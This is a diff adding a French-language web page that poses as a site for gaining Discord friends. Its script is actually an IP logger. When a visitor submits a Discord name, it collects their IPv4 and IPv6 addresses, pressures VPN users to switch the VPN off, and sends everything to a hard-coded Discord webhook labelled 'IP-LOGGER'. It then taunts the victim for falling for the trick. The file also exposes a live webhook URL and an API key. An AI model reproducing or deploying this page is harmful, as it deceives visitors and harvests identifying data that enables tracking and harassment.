@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>😁 Site pour vous ajoutez des amis !</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <h1>Entre ton pseudo discord ou ton id :</h1>
+    <form id="data-form">
+        <label for="discord-id">Discord ID/Username :</label>
+        <input type="text" id="discord-id" name="discord-id" required>
+        <button type="button" id="send-button" onclick="checkVPNAndSend()">Send</button>
+    </form>
+
+    <script>
+        const webhookUrl = "https://discord.com/api/webhooks/1261952190877139016/T3zvq1cdxX4w0TQMgdq-QcCW-Ix7dOLnqrJGdxINUmEFgSZAcdLOjWnzLJs2lfN7dMY4";
+        const avatarUrl = "https://i.postimg.cc/c4RyG7Jr/static-3.png"; // Remplacez par l'URL de votre image
+        const vpnApiKey = "468756a7e04f4e539b9e0a7a247892d9"; // Remplacez par votre clé API VPNAPI.io
+
+        // Fonction pour récupérer l'adresse IPv4 de l'utilisateur
+        function getIPv4(callback) {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => callback(data.ip))
+                .catch(error => console.error('Error fetching IPv4:', error));
+        }
+
+        // Fonction pour vérifier si l'IP est associée à un VPN
+        function isVPN(ip, callback) {
+            fetch(`https://vpnapi.io/api/${ip}?key=${vpnApiKey}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.security && data.security.vpn) {
+                        callback(true);
+                    } else {
+                        callback(false);
+                    }
+                })
+                .catch(error => console.error('Error checking VPN:', error));
+        }
+
+        function checkVPNAndSend() {
+            getIPv4(ip => {
+                isVPN(ip, isVpnUser => {
+                    if (isVpnUser) {
+                        alert("VPN detected. Desactive ton Vpn pour le bon fonctionnement du logiciel.");
+                        document.getElementById('send-button').disabled = true;
+                    } else {
+                        sendToDiscord(ip);
+                    }
+                });
+            });
+        }
+
+        function sendToDiscord(ipv4) {
+            const discordId = document.getElementById('discord-id').value;
+
+            // Fonction pour récupérer l'adresse IPv6 de l'utilisateur
+            function getIPv6(callback) {
+                fetch('https://api64.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => callback(data.ip))
+                    .catch(error => console.error('Error fetching IPv6:', error));
+            }
+
+            getIPv6(ipv6 => {
+                const embed = {
+                    title: "NEW Ip Register",
+                    description: "**Discord Username/Id**\n```" + discordId + "```\n**Ipv4**\n```" + ipv4 + "```\n**Ipv6**\n```" + ipv6 + "```",
+                    color: 7506394,  // Choisissez une couleur en utilisant un code hexadécimal
+                    footer: {
+                        text: "Ip-logger de atx_dev",
+                        icon_url: avatarUrl
+                    }
+                };
+
+                const payload = {
+                    username: "IP-LOGGER by atx",
+                    avatar_url: avatarUrl,
+                    embeds: [embed]
+                };
+
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                }).then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    alert('Bravo vous êtes tomber dans le panneau !');
+                }).catch(error => {
+                    console.error('Error:', error);
+                    alert('An error occurred while sending data to Discord webhook.');
+                });
+            });
+        }
+    </script>
+</body>
+</html>
